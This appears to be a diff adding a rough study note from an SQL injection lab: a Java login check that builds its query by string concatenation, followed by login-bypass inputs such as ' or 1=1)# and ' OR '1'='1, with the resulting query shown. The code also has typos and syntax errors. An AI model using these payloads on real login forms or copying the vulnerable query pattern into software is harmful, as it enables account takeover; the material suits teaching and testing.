@@ -1,0 +1,68 @@
+email id- alice@bank.com
+Password- alice123
+
+Try this
+alice@bank.com
+alice123'
+
+
+String email = request.getParameter("email");
+String password = request.getParameter("password");
+
+String sql = "select * from users where (email = '"+ email +"'and password = '"+password"')";
+
+Connection connetcion = pool.getConnection();
+Statement statement = connection.createStatement();
+ResultSet result = statement.executeQuery(sql);
+
+if (result.next()){
+loggedIn = True;
+#Successfully logged in and redirect to user's profile page
+
+} else {
+#Auth failure = redirect to login page
+}
+ 
+
+Then
+
+try this & review code in runtime
+
+email id- alice@bank.com
+Password- alice123''
+
+[Using two quotes '']
+
+Then try below
+alter the purpose of the SQL statement entirely?
+Try entering the following credentials: 
+Username: alice@bank.com
+Password: ' or 1=1)# 
+
+Note in MySQL the # character is used for code comments. Keep an eye on the code window, everything to the right of the # character is commented out, including the extra ' and ) character.
+
+NB: The provided SQL payload is the one you must use
+
+
+String sql = "select * from users where (email ='" + alice@bank.com +"' and password ='" + ' or 1=1)# + "')";
+SELECT * FROM users WHERE (email =    'alice@bank.com'    AND password =    '' or 1=1)#')
+
+Step 1: Enter xxx@xxx.xxx as the email address
+Step 2: Enter xxx') OR 1 = 1 -- ]
+
+Click on Submit button
+You will be directed to the dashboard
+
+
+
+Try this
+username anything
+password:-   
+' OR ''='
+' OR 1=1#'
+' OR '1'='1
+
+
+
+
+
